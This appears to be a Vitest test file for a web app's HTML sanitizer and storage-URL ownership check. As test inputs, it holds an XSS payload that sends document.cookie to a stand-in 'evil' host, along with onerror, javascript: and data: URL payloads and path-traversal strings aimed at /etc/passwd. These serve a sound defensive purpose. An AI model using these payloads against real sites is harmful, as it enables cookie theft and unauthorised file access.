import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { sanitizeHtml } from "@/lib/sanitize";
import { isOwnedStorageUrl } from "@/lib/storage";

describe("sanitizeHtml", () => {
  it("strips script and event handlers from stored rich text", () => {
    const out = sanitizeHtml(
      `<p>Hello</p><script>fetch('//evil/'+document.cookie)</script><img src=x onerror="alert(1)">`,
    );
    expect(out).toContain("<p>Hello</p>");
    expect(out).not.toContain("<script");
    expect(out).not.toContain("onerror");
  });

  it("drops javascript: and data: URLs but keeps ordinary links", () => {
    expect(sanitizeHtml(`<a href="javascript:alert(1)">x</a>`)).not.toContain("javascript:");
    expect(sanitizeHtml(`<a href="data:text/html,<script>1</script>">x</a>`)).not.toContain("data:");
    const ok = sanitizeHtml(`<a href="https://msquare.pro" title="t">link</a>`);
    expect(ok).toContain('href="https://msquare.pro"');
  });

  it("keeps the formatting a blog post actually needs", () => {
    const html = `<h2>Heading</h2><p><strong>bold</strong> <em>italic</em></p><ul><li>one</li></ul><table><tr><td>cell</td></tr></table><img src="https://cdn/x.png" alt="a">`;
    const out = sanitizeHtml(html);
    for (const tag of ["<h2>", "<strong>", "<em>", "<ul>", "<li>", "<td>", "<img"]) {
      expect(out).toContain(tag);
    }
  });

  it("removes iframes and inline styles", () => {
    const out = sanitizeHtml(`<iframe src="https://evil"></iframe><p style="position:fixed">x</p>`);
    expect(out).not.toContain("<iframe");
    expect(out).not.toContain("style=");
  });
});

describe("isOwnedStorageUrl", () => {
  const BASE = "https://pub-abc123.r2.dev";
  beforeEach(() => {
    process.env.S3_PUBLIC_BASE_URL = BASE;
  });
  afterEach(() => {
    delete process.env.S3_PUBLIC_BASE_URL;
  });

  it("accepts files this app wrote", () => {
    expect(isOwnedStorageUrl(`${BASE}/files/abc.jpg`)).toBe(true);
    expect(isOwnedStorageUrl(`${BASE}/thumbs/abc.png`)).toBe(true);
    expect(isOwnedStorageUrl(`${BASE}/review/ws1/abc.png`)).toBe(true);
    expect(isOwnedStorageUrl("/uploads/files/abc.jpg")).toBe(true);
  });

  it("rejects other hosts, so a saved URL can't aim a delete at someone else's bucket", () => {
    expect(isOwnedStorageUrl("https://evil.example/files/abc.jpg")).toBe(false);
    expect(isOwnedStorageUrl("https://pub-abc123.r2.dev.evil.com/files/a.jpg")).toBe(false);
  });

  it("rejects keys outside the prefixes we write, and any traversal", () => {
    // The danger this guards: purging derives a storage key from the URL, so an
    // arbitrary key here would delete an arbitrary object.
    expect(isOwnedStorageUrl(`${BASE}/../secret`)).toBe(false);
    expect(isOwnedStorageUrl(`${BASE}/files/../../thumbs/x.png`)).toBe(false);
    expect(isOwnedStorageUrl(`${BASE}/someone-elses-prefix/x.png`)).toBe(false);
    expect(isOwnedStorageUrl("/uploads/../../etc/passwd")).toBe(false);
  });

  it("rejects everything when no bucket is configured", () => {
    delete process.env.S3_PUBLIC_BASE_URL;
    expect(isOwnedStorageUrl("https://pub-abc123.r2.dev/files/a.jpg")).toBe(false);
  });
});
